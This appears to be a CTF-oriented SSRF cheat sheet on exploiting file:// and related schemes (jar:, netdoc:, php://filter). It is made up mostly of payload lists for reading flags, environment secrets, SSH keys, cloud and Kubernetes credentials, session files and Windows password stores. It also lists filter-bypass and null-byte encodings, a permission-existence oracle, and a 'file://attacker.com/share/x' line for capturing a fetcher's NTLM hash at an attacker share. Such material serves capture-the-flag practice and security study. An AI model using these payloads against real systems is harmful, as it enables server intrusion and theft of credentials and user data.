# file-read — file:// and the filesystem map

`file://` is the highest-value SSRF scheme — direct filesystem
read without any service in the middle. The whole question is
WHICH path; the map below covers the flag-shapes CTF uses.

---

## 1. The flag-paths — where the flag actually lives

```text
file:///flag                          — the bare form — most CTFs
file:///flag.txt
file:///flag{…}
file:///FLAG
file:///flag.md
file:///flag.php
file:///flag.py
file:///root/flag
file:///root/flag.txt
file:///home/ctf/flag
file:///home/user/flag.txt
file:///app/flag
file:///app/flag.txt
file:///opt/flag
file:///var/www/flag
file:///var/www/html/flag
file:///srv/flag
file:///secret
file:///secrets/flag
file:///tmp/flag
file:///var/flag
file:///usr/local/flag
file:///etc/flag
file:///data/flag
file:///flag_is_here
file:///this_is_the_flag
file:///readflag                        — a setuid-binary — RUN not
                                          read — file:// gives the
                                          binary not the flag
```

The `readflag` trap: a setuid binary that prints the flag when
EXECUTED — `file://` reads its bytes — useless for the flag —
it's a "RCE-required" signal not a read-path.

## 2. The env-var paths — process environment

```text
file:///proc/self/environ              — the fetcher's env — FLAG=
                                        /SECRET= live here — the
                                        env-vars the app runs with
file:///proc/1/environ                 — pid-1's env — the container's
                                        launch-env — different env!
file:///proc/<pid>/environ             — any-pid
file:///proc/self/cmdline              — how the app was launched —
                                        args/secrets-on-cmdline
file:///proc/1/cmdline
file:///proc/self/cwd → symlink — can't follow directly — but
  /proc/self/cwd/app.py works! — the CWD-prefix trick
file:///proc/self/cwd/flag             — flag in app-dir!
file:///proc/self/exe                  — the running binary
file:///proc/self/maps                 — memory-map — file-paths
                                        the process has open — the
                                        DISCOVERY path — maps lists
                                        every loaded file!
file:///proc/self/mountinfo            — what's mounted — volumes
file:///proc/self/fd/0..30             — open-fds — read pipes/socks
file:///proc/self/fdinfo/N
file:///proc/net/tcp                   — listening-sockets — the
                                        internal-port map!
file:///proc/net/tcp6
file:///proc/net/udp
file:///proc/net/fib_trie              — the host's IPs — the
                                        internal-address leak!
file:///proc/net/if_inet6
file:///proc/net/arp                   — ARP-table — NEIGHBOR IPs!
file:///proc/self/cgroup               — container-markers
file:///proc/self/status               — uid/gid/caps
file:///proc/self/uid_map
file:///proc/self/loginuid
file:///proc/sys/kernel/hostname
file:///proc/version
```

`/proc/net/arp` + `/proc/net/fib_trie` — the subnet-learn without
guessing — read the real IPs before sweeping.

## 3. The config/source paths — the app's own code

```text
file:///etc/passwd                     — the classic canary
file:///etc/shadow                     — needs-root — usually fails
file:///etc/hosts                      — internal-name map
file:///etc/resolv.conf                — DNS — k8s-svc-domain hints
file:///etc/hostname
file:///etc/environment
file:///etc/os-release
file:///etc/nginx/nginx.conf
file:///etc/nginx/sites-enabled/default
file:///etc/apache2/sites-enabled/000-default.conf
file:///etc/apache2/apache2.conf
file:///etc/supervisor/conf.d/*.conf   — supervisord — app-paths
file:///etc/supervisord.conf
file:///etc/environment
file:///etc/docker/daemon.json
file:///root/.bash_history             — commands-run — paths!
file:///root/.ssh/id_rsa               — ssh-key — rare-perms
file:///root/.ssh/authorized_keys
file:///home/x/.bash_history
file:///home/x/.ssh/id_rsa
file:///root/.aws/credentials          — aws-creds file!
file:///root/.aws/config
file:///root/.kube/config              — kubeconfig — cluster-admin?
file:///var/run/secrets/kubernetes.io/serviceaccount/token  — SA!
file:///var/run/secrets/kubernetes.io/serviceaccount/ca.crt
file:///var/run/secrets/kubernetes.io/serviceaccount/namespace
file:///app/.env                       — dotenv — THE file
file:///app/config.py
file:///app/config.yml
file:///app/settings.py
file:///app/app.py  file:///app/main.py  file:///app/server.js
file:///app/index.js  file:///app/package.json
file:///var/www/html/.env
file:///var/www/html/wp-config.php     — wordpress — DB + keys
file:///var/www/html/config.php
file:///opt/app/config.json
file:///etc/app/config.ini
file:///usr/src/app/index.js
file:///workspace/flag
file:///flag.txt
```

## 4. The log-paths — what the app already wrote

```text
file:///var/log/nginx/access.log        — request-log — see what
                                          ADMIN requests — admin's
                                          urls/params!
file:///var/log/nginx/error.log
file:///var/log/apache2/access.log
file:///var/log/apache2/error.log
file:///var/log/app.log
file:///var/log/application.log
file:///app/logs/app.log
file:///var/log/supervisor/*.log
file:///var/log/syslog
file:///var/log/auth.log                — ssh-attempts
file:///var/log/cron.log
file:///var/log/mail.log
```

Access-logs reveal the internal routes + the admin's params —
recon without scanning.

## 5. The session/cache paths — other users' state

```text
file:///tmp/sess_*                       — php-sessions — read
                                          ANOTHER user's session!
file:///var/lib/php/sessions/sess_*
file:///var/lib/php5/sessions/sess_*
file:///tmp/flask_session*
file:///var/lib/redis/dump.rdb           — redis-dump — the data!
file:///var/lib/mysql/                   — raw-mysql — can't read
                                          usefully as files — but
                                          the DIRECTORY listing
                                          confirms db-names
file:///var/lib/docker/                  — container-layer data
file:///var/cache/
file:///var/spool/
```

## 6. The OS-specific paths

```text
file:///boot/grub/grub.cfg               — boot-config
file:///etc/fstab                        — mounts
file:///etc/crontab                      — cron — scheduled cmds —
                                          the readflag-runner?
file:///var/spool/cron/crontabs/root
file:///etc/cron.d/*
file:///etc/systemd/system/*.service
file:///run/systemd/system
file:///etc/init.d/*
file:///etc/motd
file:///etc/issue
```

Windows:

```text
file:///C:/Windows/win.ini               — classic
file:///C:/boot.ini
file:///C:/inetpub/wwwroot/web.config    — iis-config — connstr!
file:///C:/Windows/System32/drivers/etc/hosts
file:///C:/Windows/System32/inetsrv/config/applicationHost.config
file:///C:/Users/Administrator/Desktop/flag.txt
file:///C:/flag.txt
file:///C:/Program Files/x/config.yml
file:///C:/Windows/Panther/Unattend.xml   — unattended-install —
                                            PLAINTEXT passwords!
file:///C:/Windows/Panther/unattended.xml
file:///C:/Windows/repair/SAM             — old-sam — password-hashes
file:///C:/Windows/System32/config/SAM    — needs-perms
```

`file://attacker.com/share/x` — the SMB-form — Windows fetchers
may reach OUT to an attacker share — NTLM-hash leak! — the fetcher's
credential goes to your share — capture it — Responder-adjacent.

## 7. The read-syntax variations — when file:// is filtered

```text
file:///etc/passwd          — canonical
file:/etc/passwd            — single-slash — curl ok, some lib ok
file:etc/passwd             — opaque-form
file://localhost/etc/passwd — localhost-authority
file://127.0.0.1/etc/passwd — host-form — SMB-ish on windows
file://0.0.0.0/etc/passwd
file://./etc/passwd          — dot-authority
file://./././etc/passwd
file:///%2e%2e/etc/passwd    — encoded-dots
file:///%65tc/passwd          — encoded-letters
file:///etc%2fpasswd          — encoded-slash — decode-order!
file:////etc//passwd           — double-slashes — collapse?
file:/\/\etc/passwd
file:/\etc\passwd              — backslash — windows-form
file:///e:/tc/passwd           — drive-form tricks
FILE:///etc/passwd             — scheme-case — case-checks?
File:///etc/passwd
fiLE:///
file://%00/etc/passwd          — null-authority
file:///etc/passwd%00          — null-suffix — c-string cutoff
file:///etc/passwd%00.jpg      — suffix-check + null-cutoff!
file:///etc/passwd#x           — fragment-suffix
file:///etc/passwd?x           — query-suffix
```

`file:///etc/passwd%00.jpg` — when the check wants `.jpg` but the
C-string ends at `\0` — the classic suffix-bypass for null-
terminated path-handlers.

## 8. The second-order read — via another scheme

```text
jar:file:///app.jar!/flag.txt           — inside an archive!
jar:file:///tmp/x.jar!/x
netdoc:///etc/passwd                    — java-netdoc — file-alias
netdoc:///flag
php://filter/convert.base64-encode/resource=/etc/passwd
   — php-filter — base64-wrap — survives non-printable — and
     php://filter is NOT the file-scheme — may pass file-checks!
php://filter/read=convert.base64-encode/resource=/flag
php://filter/convert.base64-encode/resource=index.php  — read SOURCE!
php://filter/convert.iconv.utf-8.utf-16/resource=/flag
php://filter/zlib.deflate|convert.base64-encode/resource=/flag
   — compress+encode — the chain-form — filter-grammar is deep —
     see web-lfi's filter-chain reference for the full grammar
data:// — inline-content — the reverse — WRITE a known file? no —
  data:// gives fixed-content — useless for read
```

`php://filter/convert.base64-encode/resource=` — reads ANY local
file as base64 — survives output-parsing that raw bytes would
break — and reads PHP SOURCE (binary-safe) — the app reads itself.

## 9. The directory-read — index via file://

```text
file:///var/www/html/              — some fetchers return a
                                     directory-LISTING — html or
                                     raw — inventory without a
                                     wordlist!
file:///etc/                       — same — if listings return
file:///app/
```

Most fetchers fail on dirs (IsADirectory) — but php://filter and
some handlers return listings or errors that name children.

## 10. The proc-fs discovery loop — systematic

```text
file:///proc/net/tcp       → listening-ports (hex-ports! 1F90=8080)
file:///proc/net/arp       → neighbor-IPs — the subnet map
file:///proc/net/fib_trie  → own-IPs — which interface
file:///proc/self/environ  → env — FLAG=/DB_/SECRET_
file:///proc/self/cmdline  → argv — config-paths!
file:///proc/self/cgroup   → docker/k8s — the container-shape
file:///proc/self/mountinfo → mounts — volumes/flag-mounts
file:///proc/self/maps     → loaded-files — lib-paths/app-paths
file:///proc/self/cwd/x    → app-dir-prefix — cwd-relative reads
file:///etc/hosts          → internal-names
file:///etc/resolv.conf    → dns — k8s domain-suffix for svc-names
```

The cwd-trick: `/proc/self/cwd/` resolves to the app's working-dir
— `file:///proc/self/cwd/config.py` reads the app's config
WITHOUT knowing its absolute path — defeats "flag is in app-dir,
path unknown" shapes.

## 11. The read-loop tooling

```bash
python3 tools/web/read_loop.py --help
# --url / --method / --body / --header / --field — the request shape
# walks a WORDLIST of paths through the proven file-read channel
```

Feed it `/flag /flag.txt /app/flag /etc/passwd /proc/self/environ
/proc/self/cmdline /app/.env /var/www/html/wp-config.php` — the
baseline-classifier separates "read worked" from "error-page".

## 12. The anti-patterns — what file:// can't do

```text
file:///etc/shadow          — root-only — the fetcher usually isn't
file:///root/x               — same — perm-denied — the ERROR still
                               leaks "Permission denied" = the file
                               EXISTS — oracle!
file:///proc/kcore           — memory — too big/denied
file:///dev/sda              — block-device — denied/hang
file:///dev/urandom          — infinite — timeout — the hang-DoS —
                               never fetch an infinite device
file:///var/lib/mysql/x.frm   — binary — parse-fail — but CONFIRMS
                                db-layout exists
```

`Permission denied` vs `No such file` — the permission-oracle —
file-EXISTENCE is readable even when contents aren't.
